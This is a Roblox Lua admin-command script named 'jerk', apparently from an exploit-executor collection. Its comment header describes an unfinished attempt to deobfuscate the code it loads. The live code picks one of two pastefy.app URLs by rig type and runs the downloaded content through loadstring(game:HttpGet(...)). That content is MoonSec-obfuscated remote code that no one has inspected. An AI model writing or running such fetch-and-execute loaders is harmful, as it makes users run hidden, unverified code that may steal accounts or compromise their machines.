--[[
    AK Admin Command: jerk

    DESCRIPTION:
    Character animation loader that selects different scripts based on rig type.

    STATUS: ⚠️ STILL OBFUSCATED
    Both R6 and R15 remote scripts use MoonSec V3 protection and cannot be deobfuscated
    using standard methods. The URLs below contain obfuscated code.

    BEHAVIOR:
    - Checks if character is R6 or R15 rig type
    - R6: Loads https://pastefy.app/wa3v2Vgm/raw (MoonSec V3 protected)
    - R15: Loads https://pastefy.app/YZoglOyJ/raw (MoonSec V3 protected)

    NEXT STEPS:
    - Use in-game to observe behavior
    - Memory dumping during execution
    - Contact original author for source
]]--

local player = game.Players.LocalPlayer
local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")

if humanoid and humanoid.RigType == Enum.HumanoidRigType.R6 then
    -- Load R6 version (MoonSec V3 protected)
    loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
elseif humanoid and humanoid.RigType == Enum.HumanoidRigType.R15 then
    -- Load R15 version (MoonSec V3 protected)
    loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
end